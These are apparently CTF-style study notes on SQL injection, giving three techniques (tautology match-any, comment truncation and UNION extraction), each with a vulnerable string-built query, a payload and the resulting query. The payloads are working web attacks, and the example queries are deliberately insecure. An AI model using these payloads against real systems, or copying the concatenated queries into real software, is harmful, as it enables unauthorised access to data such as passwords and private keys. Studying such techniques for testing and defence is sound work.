
# Match Any - Single Record
- Used when you know the specific record you want to return, but dont know all the needed input params
- Used if you can't change the first portion of the query

### Example 
```
// What can you pass in to {passwordVariable} so that the query evaluates to true and the record is returned?

query = f"SELECT username, created_at FROM users WHERE username='hardCodedUserYouCantChange' and password = '{passwordVariable}'"
```

- Payload: `' or 'a'='a`
  - The first single quote will escape
  - The ` or 'a'='a` is the 'Match Any' and will always return true so it retrieves the record
  - Leave off the last single quote so it escapes

```
query = f"SELECT username, created_at FROM users WHERE username='hardCodedUserYouCantChange' and password = '' or 'a'='a'"
```

# Return Early - Single Record
- Used when you want to ignore everything after your user input
- The double dash  `'--;`  starts a comment in SQL, so none of the code following the comment will execute

### Example

```
// What can you pass in to {username} so it ignores the rest of the query after it?

query = "SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username='" + username + "' AND current_timestamp = impossibleTimestampToMatch';"
```
  - Payload: `username=jim404'--;`

# Union - Single Record
- Use this when you want to select records from a different table.
- UNION will select the records from the other table and include them in the original selects results.
- In the union you need to select the same rows and data types.
  - Look at the source to see if you can just select nulls in your union, or if you have to select valid values.

### Example
DB Fiddle Playground: https://www.db-fiddle.com/f/kUwEsz6GuJpMaSps6hqeAr/2
```
// What can we pass in to {username} so that the first select doesnt find any results, but a result is returned from the table we want?

query = f"SELECT username, created_at FROM users WHERE username='{username}'"
```
- Payload: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
  - The first single quote escapes and wont match any users
  - The union must select both a string and a timestamp data type
  - The union finds the record from the flags table and combines it with the empty result from the first select
  - No closing single quote in the payload allows the query to be valid

```
query = f"SELECT username, created_at FROM users WHERE username='' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a'"
```